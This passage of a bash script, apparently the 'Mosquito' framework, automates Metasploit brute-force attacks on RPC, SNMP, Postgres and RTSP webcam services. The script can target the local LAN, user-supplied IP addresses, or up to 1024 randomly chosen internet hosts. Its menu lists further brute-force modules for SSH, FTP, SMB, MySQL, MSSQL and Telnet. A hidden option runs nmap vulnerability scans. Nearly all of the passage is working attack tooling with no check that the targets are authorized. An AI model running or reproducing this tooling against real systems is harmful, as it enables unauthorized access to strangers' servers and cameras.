      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource rpc_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 205.72.213.47 199.197.116.190" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource rpc_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 800 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource rpc_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# Brute Force snmp service :: done
#
sh_twelve () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} snmp_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource snmp_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 192.249.87.128 24.24.40.36" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource snmp_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 250 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource snmp_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



#
# Brute Force postgres service :: done
#
sh_treze () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} postgres_brute resource_"${Reset};
   sleep 1
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource postgres_brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 205.88.183.168 185.99.212.190" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;resource postgres_brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 500 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource postgres_brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}



sh_quatorze () {
   echo "${BlueF}[${YellowF}running${BlueF}]:${white} rtsp_url_brute resource_"${Reset};
   sleep 1
   IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
   scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
   echo "$RANGE" > ip_range.txt
   #
   # Sellect the type of scan to use
   #
   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg LHOST $IPADDR;resource rtsp-url-brute.rc"
   #
   # scanning user inputs
   #
   elif [ "$scan" = "Scan user input rhosts" ]; then
      echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 201.203.27.251 159.121.101.207" --width 450) > /dev/null 2>&1
      msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource rtsp-url-brute.rc"
   #
   # scanning ramdom WAN hosts
   #
   elif [ "$scan" = "Random search WAN for rhosts" ]; then
      echo "${BlueF}[☠]${white} Random Search WAN for rhosts"${Reset};
      sealing=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Limmit the number of rhosts to find\nDefault: 700 (max = 1024)" --width 300) > /dev/null 2>&1

      max="1024"
      rm -f 1024 > /dev/nul 2>&1
      ## Make sure the LIMMIT value did not have exceded the max allowed
      if [ $sealing -gt $max ]; then
         echo ${RedF}"[x]${white} LIMMIT SET TO HIGTH:${RedF}$sealing${white}, SETTING TO MAX ALLOWED.."${Reset};
         sealing="1024"
         sleep 1
      fi
      echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;resource rtsp-url-brute.rc"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}


sh_easter_egg () {
echo "${BlueF}[${YellowF}running${BlueF}]:${white} 🦟easter_egg🦟 ${BlueF}:[${YellowF}BlueTeam${BlueF}]${white}"${Reset};
sleep 1

## Local variable declarations
IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" TRUE "Scan $IPADDR" --width 330 --height 180) > /dev/null 2>&1

   if [ "$scan" = "Scan Local Lan" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports 1000 --open --script=vuln $RANGE.0/24;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $RANGE.0/24;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
   elif [ "$scan" = "Scan $IPADDR" ]; then
      echo "${BlueF}[☠]${white} Scanning Local Machine: $IPADDR🦟"${Reset};
      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports 1000 --open --script=vuln $IPADDR;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $IPADDR;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
   else
      echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
      sleep 2 && sh_main
   fi
}






###################################################################
#                   * 🦟 MOSQUITO MAIN MENU 🦟 *                  #
###################################################################
sh_main () {
rm -f 1024 > /dev/nul 2>&1
}
# loop forever
while :
do
clear
echo "---"${BlueF}
cat << !
                                                🦟__________       
              _______🦟________________________  ___(_) _  /______🦟
           __  __  __ \  __ \_  ___/  __  /  / / /_  /_  __/  __ \\
         🦟_  / / / / / /_/ /(__  )/ /_/ // /_/ /_  / / /_ / /_/ /
           /_/ /_/ /_/\____//____/ \__, / \__,_/ /_/  \__/ \____/v:$ver
                                     /_/ 🦟 Author:r00t-3xp10it        🦟
!
echo "" && echo "${BlueF}    ${RedF}:${BlueF}Framework Description${RedF}:${BlueF}"${Reset};
cat << !
       Mosquito uses metasploit auxiliary modules + nmap nse + resource files
       to be abble to automate remote brute force tasks over WAN/LAN networks.
       'scan Local Lan, scan user inputs (rhosts),Search WAN for random hosts'

!
echo "---"
echo "    ${RedF}:${BlueF}USER${RedF}:${white}$user ${BlueF}ENV${RedF}:${white}$EnV ${BlueF}INTERFACE${RedF}:${white}$InT3R ${BlueF}ARCH${RedF}:${white}$ArCh ${BlueF}DISTRO${RedF}:${white}$DiStRo ${BlueF}HOSTNAME${RedF}:${white}$htn"${Reset};
cat << !
    ╔──────────╦───────────────────────╦────────────────────────────────────────╗
    ║  OPTION  ║     RESOURCE FILE     ║               DESCRIPTION              ║
    ╠──────────╬───────────────────────╬────────────────────────────────────────╣
    ║    1     ║     geo_location      ║   scan remote hosts geo location       ║
    ║    2     ║     brute_force       ║   scan - brute most commom ports       ║
    ║    3     ║     ms17_010          ║   scan - brute remote smb service      ║
    ║    4     ║     ssh_brute         ║   scan - brute remote ssh service      ║
    ║    5     ║     ftp_brute         ║   scan - brute remote ftp service      ║
    ║    6     ║     http_cve          ║   scan - brute remote http service     ║
    ║    7     ║     winrm_brute       ║   scan - brute remote winrm service    ║
    ║    8     ║     mysql_brute       ║   scan - brute remote mysql service    ║
    ║    9     ║     mssql_brute       ║   scan - brute remote mssql service    ║
    ║   10     ║     telnet_brute      ║   scan - brute remote telnet service   ║
    ║   11     ║     rpc_brute         ║   scan - brute remote rpc service      ║
    ║   12     ║     snmp_brute        ║   scan - brute remote snmp service     ║
    ║   13     ║     postgres_brute    ║   scan - brute remote postgres serv    ║
    ║   14     ║     rtsp_url_brute    ║   scan for remote live webcam's url's  ║
    ╠──────────╩───────────────────────╩────────────────────────────────────────╣
    ║    E     -     Exit mosquito                                              ║
    ╚───────────────────────────────────────────────────────────────────────────╣
!
echo "                                                           🦟${BlueF}SSA${YellowF}©${RedF}RedTeam${YellowF}@${BlueF}2019${white}🦟─╝"${Reset};
echo ""
echo "${BlueF}[☠]${white} mosquito framework"${Reset}
sleep 1
echo -n "${BlueF}[${GreenF}➽${BlueF}]${white} Chose Option number${RedF}:${white}"${Reset};
read choice
case $choice in
1)
    sh_one # geo_location function
;;
2)
    sh_two # most common ports brute force function
;;
3)
    sh_tree  # ms17_010 (smb) function
;;
4)
    sh_quatro  # SSH function
;;
5)
    sh_cinco  # FTP function
;;
6)
    sh_six  # HTTP CVE function
;;
7)
    sh_seven  # WINRM snmp function
;;
8)
    sh_oito  # MYSQL  function
;;
9)
    sh_nine  # MSSQL function
;;
10)
    sh_ten  # TELNET function
;;
11)
    sh_onze  # RPC function
;;
12)
    sh_twelve  # SNMP function
;;
13)
    sh_treze  # POSTGRES function
;;
14)
    sh_quatorze  # RTSP (webcams) function
;;
easter_egg)
    ## Mosquito Hidden option
    # whitehat - search for vuln's/cve's in local lan
    sh_easter_egg
;;
e|E)
    echo "${BlueF}[${YellowF}i${BlueF}]${white} Closing framework 🦟Bzzzz."${Reset};
    service postgresql stop | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
rm -f ip_range.txt > /dev/nul 2>&1
exit
;;
h|H)
    echo "${BlueF}[${YellowF}i${BlueF}] [${YellowF}EXECUTE${BlueF}] sudo ./mosquito.sh -h"${Reset};
    service postgresql stop | zenity --progress --pulsate --title "🦟 PLEASE WAIT 🦟" --text="Stoping postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
exit
;;
*)
    echo "${BlueF}[${RedF}x${BlueF}]${white} '${RedF}$choice${white}': is not a valid Option 🦟Bzzzz."${Reset};
    sleep 2 && sh_main
;;
esac
done
